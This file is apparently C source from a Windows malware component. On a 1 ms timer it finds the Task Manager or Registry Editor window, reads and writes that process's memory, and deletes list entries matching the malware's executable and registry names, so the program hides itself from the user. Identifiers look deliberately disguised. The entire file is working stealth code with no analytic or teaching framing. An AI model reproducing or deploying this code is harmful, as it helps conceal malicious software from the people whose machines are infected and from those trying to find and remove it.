#include "global.h"
#include <stdio.h>
#include <windows.h>
#include <commctrl.h>

#define TIMER		800

		HWND hWnd;
		UINT TimerRet;

BOOL HideIt(LPTSTR lpProc);
void CALLBACK TimerProc(HWND, UINT, UINT, DWORD);
int Instr( char *SearchString, char *SearchTerm );


BOOL HideIt(LPTSTR lpProc)
{


	HWND hwnd1 = FindWindow(win_number, NULL);

	KillTimer(hwnd1, 0);

     hwnd1 = FindWindowEx(hwnd1, NULL, win_number, NULL);

		if (hwnd1 == 0)
			hwnd1 = FindWindowEx(NULL, NULL, regedit, NULL);


	HWND listview = FindWindowEx(hwnd1, NULL, syslist32, NULL);

	int count=(int)SendMessage(listview, LVM_GETITEMCOUNT, 0, 0);
	int i;

	LVITEM lvi, *_lvi;
	char item[512];
	char *_item;
	unsigned long pid;

	HANDLE process;

	GetWindowThreadProcessId(listview, &pid);
	process=OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION, FALSE, pid);

	_lvi=(LVITEM*)VirtualAllocEx(process, NULL, sizeof(LVITEM), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	_item=(char*)VirtualAllocEx(process, NULL, 512, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	lvi.cchTextMax=512;

	for(i=0; i<count; i++) {

		lvi.iSubItem=0;
		lvi.pszText=_item;

		WriteProcessMemory(process, _lvi, &lvi, sizeof(LVITEM), NULL);
		SendMessage(listview, LVM_GETITEMTEXT, (WPARAM)i, (LPARAM)_lvi);


		ReadProcessMemory(process, _item, item, 512, NULL);


	if( Instr(item , lpProc) ){

			ListView_DeleteItem(listview, i);
	}



	}

	VirtualFreeEx(process, _lvi, 0, MEM_RELEASE);
	VirtualFreeEx(process, _item, 0, MEM_RELEASE);

	return 0;

}


int Instr( char *SearchString, char *SearchTerm )
{
    int stringSize = strlen( SearchString );
    int termSize = strlen( SearchTerm );

    if ( termSize > stringSize )
    {
        return 0;
    }

    int numberFound = 0;
    const char* subString = NULL;

    int i = 0;
    for ( i ; i <= stringSize - termSize; ++i )
    {
        if ( strncmp( &SearchString[ i ], SearchTerm, termSize ) == 0 )
        {
            i += termSize;
            ++numberFound;
        }
    }

    return numberFound;
}


LRESULT CALLBACK WndProc(HWND hWnd,UINT iMsg,
							WPARAM wParam, LPARAM lParam)
{
	TimerRet = SetTimer(hWnd,TIMER,1,&TimerProc);
		return TimerRet;
}



void CALLBACK TimerProc(HWND thWnd, UINT tMsg, UINT tId, DWORD tSysTime)
{
	HideIt(exename);
	HideIt(regname);
}


DWORD WINAPI CreateWin(HINSTANCE hInstance) {

	char *const MainClassName = t1m3r;
	WNDCLASSEX pbclass;
	MSG msg;
	pbclass.cbSize = sizeof(pbclass);
	pbclass.style = CS_HREDRAW | CS_VREDRAW;
	pbclass.lpfnWndProc = WndProc;
	pbclass.cbClsExtra = 0;
	pbclass.cbWndExtra = 0;
	pbclass.hInstance = hInstance;
	pbclass.hIcon = LoadIcon(NULL,IDI_APPLICATION);
	pbclass.hCursor = LoadCursor(NULL,IDC_ARROW);
	//pbclass.hbrBackground = (HBRUSH)GetStockObject(LTGRAY_BRUSH);
	pbclass.lpszMenuName = NULL;
	pbclass.lpszClassName = MainClassName;
	pbclass.hIconSm = LoadIcon(NULL,IDI_APPLICATION);

	RegisterClassEx(&pbclass);

	hWnd = CreateWindow(MainClassName, MainClassName,
						WS_OVERLAPPEDWINDOW|0, CW_USEDEFAULT, CW_USEDEFAULT,
						300, 200,NULL, NULL, hInstance, NULL);

while(GetMessage(&msg,NULL,0,0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return msg.wParam;

}

